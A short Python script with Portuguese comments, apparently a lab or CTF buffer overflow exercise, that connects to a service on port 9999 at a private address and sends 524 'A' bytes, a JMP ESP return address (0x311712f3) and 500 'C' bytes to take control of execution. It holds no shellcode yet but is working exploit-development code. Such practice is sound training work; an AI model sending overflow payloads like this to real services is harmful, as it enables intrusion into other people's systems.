#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

# Importa a biblioteca Socket
import socket
# Importa a biblioteca Struct
from struct import pack
# Cria a conexão com a máquina e se conecta
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('192.168.122.49',9999))
# Envia um buffer de 524 "A", 4 "B" e 500 "C"
buffer = b"A" * 524

buffer += pack('<I', 0x311712f3) # JMP ESP

buffer += b"C" * 500
print("[+] Enviando Buffer de 524 'A', JMP ESP e 500 'C' [+]")
client.send(buffer)